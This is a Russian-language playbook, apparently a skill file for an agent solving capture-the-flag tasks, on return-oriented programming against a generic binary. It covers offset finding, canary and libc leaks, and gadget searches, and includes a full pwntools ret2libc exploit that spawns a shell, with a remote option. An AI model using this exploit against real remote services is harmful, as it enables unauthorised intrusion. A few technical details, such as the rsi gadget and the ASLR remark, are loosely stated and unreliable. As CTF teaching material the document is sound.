# skill: pwn-rop

ROP-плейбук. Нет сюрпризов, но каждый шаг нужно пройти без пропусков.

## 1. Контроль RIP

```python
# work/stage1_offset.py
from pwn import *
elf = ELF('./binary')
io = elf.process()
io.sendline(cyclic(300))
io.wait_for_close()
# core dump → cyclic -l $RSP
```

Фиксируй `offset_to_rip` в `verification.md`.

## 2. Канарейка (если canary=yes)

- partial overwrite: часто первый байт canary — `\x00`; читаем через `printf`-leak с `%s`;
- fmt-string leak: `%7$p` до `%40$p`, запиши таблицу в `work/fmt-leaks.md`;
- fork server: canary одинаковый у всех процессов → brute-force по 1 байту (256 попыток × 8 байт).

## 3. Code leak (если PIE=on)

- отдать `puts(got.puts)` → получить libc-base;
- или использовать stack-leak для прыжка в `_start`.

## 4. Поиск гаджетов

```
ropper --file ./binary --search "pop rdi"
ropper --file ./libc.so.6 --search "pop rdi; ret"
ROPgadget --binary ./binary --only "pop|ret"
```

Минимальный набор x86-64:
- `pop rdi; ret` — 1-й аргумент;
- `pop rsi; pop rbx; ret` (или `pop rsi; ret`) — 2-й;
- `pop rdx; ret` — 3-й;
- `ret` — для выравнивания стека (16-byte align) перед `system`.

## 5. ret2libc

```python
# work/exploit.py
from pwn import *
elf   = ELF('./binary')
libc  = ELF('./libc.so.6')
io    = elf.process()                 # или remote(host, port)

OFFSET = 72                            # из шага 1
pop_rdi = 0x401313                     # из шага 4
ret     = 0x40101a                     # для 16-byte align

# leak
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(elf.got.puts)
payload += p64(elf.plt.puts) + p64(elf.sym.main)
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")

# rce
sh      = next(libc.search(b'/bin/sh\x00'))
system  = libc.sym.system

payload  = b'A' * OFFSET
payload += p64(ret)                    # ← 16-byte alignment
payload += p64(pop_rdi) + p64(sh)
payload += p64(system)
io.sendline(payload)
io.interactive()
```

## 6. Выравнивание — классический баг

На x86-64 `movaps` в `do_system()` требует 16-byte align. Если после buffer-overflow стек «кривой» — вставь один `ret`-гаджет перед `system`.

Признак проблемы: эксплойт стрельнул ровно до `system`, краш внутри `do_system`.

## 7. ASLR на remote

ASLR в libc меняет 12 младших бит base'а на фикс (page-aligned). Low-3-nibble leak однозначен → libc-database.
